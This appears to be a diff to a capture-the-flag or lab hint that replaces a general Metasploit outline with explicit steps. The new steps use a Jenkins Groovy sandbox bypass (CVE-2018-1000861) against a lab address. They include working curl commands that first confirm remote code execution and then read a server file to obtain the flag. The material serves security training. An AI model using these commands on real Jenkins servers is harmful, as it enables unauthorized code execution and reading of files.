@@ -1,12 +1,24 @@
-Three steps:
+The exploit, step by step:
 
-1. Find the right module. It matches the CVE from stage 2 and
-   it's the *exploit*, not the detector.
-     grep -l "CVE-2018-1000861" modules/*
-     # two hits. Read both headers. Pick the one that says exploit.
+1. Confirm the bug still fires. Run:
 
-2. Pick a payload from that module's COMPATIBLE PAYLOADS list.
-   Check payloads/ to make sure the architecture matches the
-   target (re-read your stage 1 scan — kernel reports i686).
+    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
 
-3. Assemble RHOST, RPORT, TARGETURI from earlier stages. Fire.
+   You should see "Result: 42". If you don't, the URL got mangled
+   on its way through. Try again with the WHOLE URL inside single
+   quotes (so your shell doesn't eat any characters).
+
+2. Swap the println(42) for a file read. The Groovy expression is:
+
+       new File("/var/m0use/blueprint.txt").text
+
+   URL-encoded for curl that becomes:
+
+       new%20File(%22/var/m0use/blueprint.txt%22).text
+
+   So the curl command is:
+
+    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
+
+3. The server prints back the contents of the file. The flag is in
+   there — find the line that starts with "Flag:" and submit it.
